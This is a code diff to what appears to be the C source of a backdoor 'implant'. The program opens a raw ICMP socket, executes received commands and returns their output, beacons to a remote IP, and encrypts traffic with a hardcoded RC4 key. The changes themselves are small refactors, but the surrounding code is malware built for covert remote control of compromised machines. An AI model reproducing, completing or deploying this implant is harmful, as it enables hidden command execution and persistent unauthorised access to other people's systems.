@@ -1,9 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
 #include "../include/implant.h"
 #include "../include/rc4.h"
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
-#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}
 
 // creates a raw ICMP socket and binds it
 int create_socket(void) {
@@ -47,7 +51,7 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     FILE *ptr;
     char *buffer, *command;
     size_t temp_buffer_size;
-    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE + 6, 1); // added 6 to prevent overflow
+    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE + 6, 1); // added 6 to prevent overflow?
     CHECK_ALLOC(temp_buffer);
 
     data[strlen((char *) data) - 1] = '\0'; // strip the newline
@@ -97,9 +101,9 @@ int read_from_socket(int sockfd, unsigned char *buffer, int size) {
 int send_beacon(int sockfd, char *dst_ip) {
     char *packet;
     struct icmphdr *icmp;
-    int packet_size = sizeof(struct icmphdr *);
-    ssize_t bytes_num;
     struct sockaddr_in dst;
+    ssize_t bytes_num;
+    size_t packet_size = sizeof(struct icmphdr *);
 
     packet = malloc(sizeof(unsigned char) * packet_size);
     CHECK_ALLOC(packet)
